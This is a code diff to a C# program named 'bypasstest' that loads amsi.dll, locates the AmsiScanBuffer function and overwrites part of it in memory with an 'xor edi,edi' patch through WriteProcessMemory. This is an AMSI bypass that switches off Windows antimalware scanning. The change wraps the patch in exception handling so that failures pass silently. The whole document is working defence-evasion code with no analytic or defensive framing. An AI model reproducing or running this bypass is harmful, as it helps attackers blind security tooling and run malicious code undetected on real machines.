@@ -57,6 +57,9 @@ namespace bypasstest
         [DllImport("kernel32.dll")]
         public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
+        //allow us to catch a System.AccessViolationException in managed code and continue
+        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
+        [System.Security.SecurityCritical]
         static void Main(string[] args)
         {
             IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
@@ -80,9 +83,13 @@ namespace bypasstest
             //Setting a pointer to the patch opcode array (unmanagedPointer)
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
             Marshal.Copy(patch, 0, unmanagedPointer, 3);
-
-            //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
-            WriteProcessMemory(procHandle, AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
+            try{
+              //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
+              WriteProcessMemory(procHandle, AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
+            } catch {
+              //silent continue
+            }
         }
     }
 }
+
